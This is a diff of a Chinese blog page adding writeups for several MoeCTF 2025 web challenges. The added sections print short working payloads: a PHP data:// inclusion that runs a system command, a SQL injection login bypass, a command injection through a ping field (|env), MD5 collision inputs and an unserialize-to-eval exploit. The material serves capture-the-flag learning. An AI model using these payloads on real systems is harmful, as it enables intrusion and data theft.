@@ -32,8 +32,22 @@
 <meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E7%AC%AC%E4%BA%8C%E7%AB%A0_1.png">
 <meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E7%AC%AC%E4%BA%8C%E7%AB%A0_2.png">
 <meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E7%AC%AC%E4%BA%8C%E7%AB%A0_3.png">
+<meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E7%AC%AC%E4%B8%89%E7%AB%A0.png">
+<meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E7%AC%AC%E4%BA%94%E7%AB%A0.png">
+<meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5.png">
+<meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E8%9A%81%E5%89%91.png">
+<meta property="og:image" content="http://m21in.github.io/images/moectf2025/file.png">
+<meta property="og:image" content="http://m21in.github.io/themes/next/source/images/moectf2025/%E7%8C%9C%E7%8C%9C%E7%88%86.png">
+<meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E7%A0%B4%E9%98%B5_1.png">
+<meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E7%A0%B4%E9%98%B5_2.png">
+<meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E7%A0%B4%E9%98%B5_3.png">
+<meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E7%A0%B4%E9%98%B5_4.png">
+<meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E7%A0%B4%E9%98%B5_5.png">
+<meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E7%A0%B4%E9%98%B5_6.png">
+<meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E7%A0%B4%E9%98%B5_7.png">
+<meta property="og:image" content="http://m21in.github.io/images/moectf2025/%E6%8E%A8%E6%BC%94_1.png">
 <meta property="article:published_time" content="2025-08-12T10:54:24.000Z">
-<meta property="article:modified_time" content="2025-08-25T08:58:06.904Z">
+<meta property="article:modified_time" content="2025-09-01T10:44:55.893Z">
 <meta property="article:author" content="M21in">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="writeup">
@@ -141,7 +155,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">15</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">14</span></a>
 
   </li>
   </ul>
@@ -202,7 +216,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-08-25 16:58:06" itemprop="dateModified" datetime="2025-08-25T16:58:06+08:00">2025-08-25</time>
+                <time title="修改时间：2025-09-01 18:44:55" itemprop="dateModified" datetime="2025-09-01T18:44:55+08:00">2025-09-01</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -249,6 +263,67 @@
 <p>说路径不正，本来以为是目录穿越，但想到题目提示，bp抓了个包</p>
 <p>请求头就有flag</p>
 <p><img src="/images/moectf2025/%E7%AC%AC%E4%BA%8C%E7%AB%A0_3.png"></p>
+<h1 id="问剑石！篡天改命！"><a href="#问剑石！篡天改命！" class="headerlink" title="问剑石！篡天改命！"></a><strong>问剑石！篡天改命！</strong></h1><p>看题目 要改天赋为S，光芒改成flowing_azure_clouds</p>
+<p>bp抓包改一下相应参数，就有flag</p>
+<p><img src="/./images/moectf2025/%E7%AC%AC%E4%B8%89%E7%AB%A0.png"></p>
+<h1 id="打上门来！"><a href="#打上门来！" class="headerlink" title="打上门来！"></a><strong>打上门来！</strong></h1><p>提示目录穿越漏洞，直接试flag位置</p>
+<p><img src="/./images/moectf2025/%E7%AC%AC%E4%BA%94%E7%AB%A0.png"></p>
+<h1 id="天机符阵"><a href="#天机符阵" class="headerlink" title="天机符阵"></a><strong>天机符阵</strong></h1><p>非预期直接访问flag.txt</p>
+<p>就是flag</p>
+<p><img src="/./images/moectf2025/%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5.png"></p>
+<h1 id="玉魄玄关·破妄"><a href="#玉魄玄关·破妄" class="headerlink" title="玉魄玄关·破妄"></a><strong>玉魄玄关·破妄</strong></h1><p>提示了蚁剑，看源码直接蚁剑连接，flag在环境变量</p>
+<p><img src="/./images/moectf2025/%E8%9A%81%E5%89%91.png"></p>
+<h1 id="昆仑星途"><a href="#昆仑星途" class="headerlink" title="昆仑星途"></a><strong>昆仑星途</strong></h1><p>给了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>传参file的时候会多加个.php后缀</p>
+<p>这里源码看到php的两个on都打开着，想到data伪协议</p>
+<p><img src="/./images/moectf2025/file.png"></p>
+<p>flag在根目录下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain,&lt;?php%20system(&quot;cat%20/flag-Xi2SNd5QEePGRxovvwHciIAhCP0Q1a.txt&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<h1 id="Moe笑传之猜猜爆"><a href="#Moe笑传之猜猜爆" class="headerlink" title="Moe笑传之猜猜爆"></a><strong>Moe笑传之猜猜爆</strong></h1><p>bp抓不到包，题目也说不是爆破，那直接看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(userGuess === randomNumber) &#123;</span><br><span class="line">  lastResult.textContent = <span class="string">&#x27;恭喜你！猜对了！&#x27;</span>;</span><br><span class="line">  lastResult.style.backgroundColor = <span class="string">&#x27;green&#x27;</span>;</span><br><span class="line">  lowOrHi.textContent = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  guessField.disabled = <span class="literal">true</span>;</span><br><span class="line">  guessBtn.disabled = <span class="literal">true</span>;</span><br><span class="line">  <span class="comment">// 猜对后请求flag</span></span><br><span class="line">  <span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>, &#123;<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>&#125;)</span><br><span class="line">    .<span class="title function_ invoke__">then</span>(res =&gt; res.<span class="title function_ invoke__">json</span>())</span><br><span class="line">    .<span class="title function_ invoke__">then</span>(data =&gt; &#123;</span><br><span class="line">      document.<span class="title function_ invoke__">querySelector</span>(<span class="string">&#x27;.flagResult&#x27;</span>).textContent = <span class="string">&quot;FLAG: &quot;</span> + data.flag;</span><br><span class="line">    &#125;);</span><br><span class="line">  <span class="title function_ invoke__">setGameOver</span>();</span><br></pre></td></tr></table></figure>
+
+<p>可以看到flag在&#x2F;flag路径下，要以POST方式请求</p>
+<p>所以这里可以Hackbar直接POST随便传个参</p>
+<p><img src="/./../../themes/next/source/images/moectf2025/%E7%8C%9C%E7%8C%9C%E7%88%86.png"></p>
+<p>访问flag页面就有flag</p>
+<h1 id="金曦破禁与七绝傀儡阵"><a href="#金曦破禁与七绝傀儡阵" class="headerlink" title="金曦破禁与七绝傀儡阵"></a><strong>金曦破禁与七绝傀儡阵</strong></h1><p>http请求，按题目要求来传参</p>
+<p><img src="/./images/moectf2025/%E7%A0%B4%E9%98%B5_1.png"></p>
+<p><img src="/./images/moectf2025/%E7%A0%B4%E9%98%B5_2.png"></p>
+<p><img src="/./images/moectf2025/%E7%A0%B4%E9%98%B5_3.png"></p>
+<p><img src="/./images/moectf2025/%E7%A0%B4%E9%98%B5_4.png"></p>
+<p><img src="/./images/moectf2025/%E7%A0%B4%E9%98%B5_5.png"></p>
+<p><img src="/./images/moectf2025/%E7%A0%B4%E9%98%B5_6.png"></p>
+<p><img src="/./images/moectf2025/%E7%A0%B4%E9%98%B5_7.png"></p>
+<p>最后这个bp得改一下编码为utf-8，否则中文乱码</p>
+<h1 id="藏经禁制？玄机初探！"><a href="#藏经禁制？玄机初探！" class="headerlink" title="藏经禁制？玄机初探！"></a><strong>藏经禁制？玄机初探！</strong></h1><p>常规万能密码</p>
+<p>用户admin</p>
+<p>密码1’ or 1&#x3D;1#</p>
+<p>直接就有flag</p>
+<h1 id="灵蛛探穴与阴阳双生符"><a href="#灵蛛探穴与阴阳双生符" class="headerlink" title="灵蛛探穴与阴阳双生符"></a><strong>灵蛛探穴与阴阳双生符</strong></h1><p>看题目直接确定是robots.txt，里面提示&#x2F;flag.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> == <span class="variable">$b</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error 1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) != <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error 2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
+
+<p>一段php的RCE</p>
+<p>a和b要求不相等且md5值相等</p>
+<p>直接找到两个相等的值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=s878926199a&amp;&amp;b=s155964671a</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="星墟禁制·天机问路"><a href="#星墟禁制·天机问路" class="headerlink" title="星墟禁制·天机问路"></a><strong>星墟禁制·天机问路</strong></h1><p>很常规的ping域名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.baidu.com|env</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./images/moectf2025/%E6%8E%A8%E6%BC%94_1.png"></p>
+<h1 id="星骸迷阵·神念重构"><a href="#星骸迷阵·神念重构" class="headerlink" title="星骸迷阵·神念重构"></a><strong>星骸迷阵·神念重构</strong></h1><p>简单的反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>传参phpinfo一把梭</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;a = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>搜索flag就有</p>
 
     </div>
 
@@ -270,8 +345,8 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/87df8320.html" rel="prev" title="2025 SWPU-NSSCTF 秋季招新入门训练赛writeup">
-      <i class="fa fa-chevron-left"></i> 2025 SWPU-NSSCTF 秋季招新入门训练赛writeup
+    <a href="/2998c71a.html" rel="prev" title="NepCTF2025">
+      <i class="fa fa-chevron-left"></i> NepCTF2025
     </a></div>
       <div class="post-nav-item">
     <a href="/32721522.html" rel="next" title="解决Typora和hexo的图片显示问题">
@@ -336,7 +411,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="nav-number">1.</span> <span class="nav-text">web入门指北</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF"><span class="nav-number">2.</span> <span class="nav-text">神秘的手镯</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9D%E8%AF%86%E9%87%91%E6%9B%A6%E7%8E%84%E8%BD%A8"><span class="nav-number">3.</span> <span class="nav-text">初识金曦玄轨</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="nav-number">1.</span> <span class="nav-text">web入门指北</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF"><span class="nav-number">2.</span> <span class="nav-text">神秘的手镯</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9D%E8%AF%86%E9%87%91%E6%9B%A6%E7%8E%84%E8%BD%A8"><span class="nav-number">3.</span> <span class="nav-text">初识金曦玄轨</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%97%AE%E5%89%91%E7%9F%B3%EF%BC%81%E7%AF%A1%E5%A4%A9%E6%94%B9%E5%91%BD%EF%BC%81"><span class="nav-number">4.</span> <span class="nav-text">问剑石！篡天改命！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%89%93%E4%B8%8A%E9%97%A8%E6%9D%A5%EF%BC%81"><span class="nav-number">5.</span> <span class="nav-text">打上门来！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5"><span class="nav-number">6.</span> <span class="nav-text">天机符阵</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%89%E9%AD%84%E7%8E%84%E5%85%B3%C2%B7%E7%A0%B4%E5%A6%84"><span class="nav-number">7.</span> <span class="nav-text">玉魄玄关·破妄</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%98%86%E4%BB%91%E6%98%9F%E9%80%94"><span class="nav-number">8.</span> <span class="nav-text">昆仑星途</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Moe%E7%AC%91%E4%BC%A0%E4%B9%8B%E7%8C%9C%E7%8C%9C%E7%88%86"><span class="nav-number">9.</span> <span class="nav-text">Moe笑传之猜猜爆</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%87%91%E6%9B%A6%E7%A0%B4%E7%A6%81%E4%B8%8E%E4%B8%83%E7%BB%9D%E5%82%80%E5%84%A1%E9%98%B5"><span class="nav-number">10.</span> <span class="nav-text">金曦破禁与七绝傀儡阵</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%97%8F%E7%BB%8F%E7%A6%81%E5%88%B6%EF%BC%9F%E7%8E%84%E6%9C%BA%E5%88%9D%E6%8E%A2%EF%BC%81"><span class="nav-number">11.</span> <span class="nav-text">藏经禁制？玄机初探！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%81%B5%E8%9B%9B%E6%8E%A2%E7%A9%B4%E4%B8%8E%E9%98%B4%E9%98%B3%E5%8F%8C%E7%94%9F%E7%AC%A6"><span class="nav-number">12.</span> <span class="nav-text">灵蛛探穴与阴阳双生符</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%98%9F%E5%A2%9F%E7%A6%81%E5%88%B6%C2%B7%E5%A4%A9%E6%9C%BA%E9%97%AE%E8%B7%AF"><span class="nav-number">13.</span> <span class="nav-text">星墟禁制·天机问路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%98%9F%E9%AA%B8%E8%BF%B7%E9%98%B5%C2%B7%E7%A5%9E%E5%BF%B5%E9%87%8D%E6%9E%84"><span class="nav-number">14.</span> <span class="nav-text">星骸迷阵·神念重构</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -352,7 +427,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
